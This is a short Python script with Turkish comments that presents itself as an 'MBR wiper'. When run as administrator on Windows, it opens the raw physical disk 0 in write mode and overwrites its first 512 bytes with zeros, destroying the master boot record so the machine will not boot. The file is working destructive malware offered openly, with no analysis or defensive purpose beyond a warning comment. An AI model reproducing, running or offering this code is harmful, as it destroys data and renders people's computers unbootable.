import sys
import ctypes

# --- GÜVENLİK PİMİ YOK (ÇOK TEHLİKELİ) ---
# DİKKAT: Bu kod Yönetici olarak çalışırsa PC bir daha açılmaz.

def mbr_killer():
    print("--- MBR WIPER BAŞLATILIYOR ---")
    print("Hedef: Fiziksel Disk 0 (Ana Harddisk)")
    
    # Windows'ta ana diske doğrudan erişim yolu
    # \\.\PhysicalDrive0 = Senin C Diskinin donanım hali
    drive_path = r"\\.\PhysicalDrive0"
    
    try:
        # 1. DİSKİ DONANIM SEVİYESİNDE AÇ (Yazma Modu)
        # 'rb+' = Hem okuma hem yazma (Binary)
        with open(drive_path, "r+b") as disk:
            
            # 2. ÖLÜMCÜL YÜK (Payload)
            # 512 Byte'lık boş (0) veya rastgele veri oluştur
            # Bu, MBR'ın olduğu boyuttur.
            olumcul_veri = b'\x00' * 512
            
            # 3. İNFAZ ANI
            print("[!] MBR sektörü siliniyor...")
            
            # Diskin en başına (0. Bayt) git
            disk.seek(0)
            
            # Veriyi yaz (MBR'ı ezer geçer)
            disk.write(olumcul_veri)
            
            print("💀 İŞLEM TAMAM. BİLGİSAYAR ÖLDÜ.")
            print("Yeniden başlatıldığında 'Boot Device Not Found' hatası verecek.")
            
    except PermissionError:
        print("[-] Hata: Yönetici izni gerekiyor! (Şanslısın, kurtuldun)")
    except Exception as e:
        print(f"[-] Bir hata oluştu: {e}")

if __name__ == "__main__":
    # Windows ise yönetici mi diye kontrol et (Süs olsun diye)
    if not ctypes.windll.shell32.IsUserAnAdmin():
        print("Lütfen Yönetici Olarak Çalıştırın!")
    else:
        mbr_killer()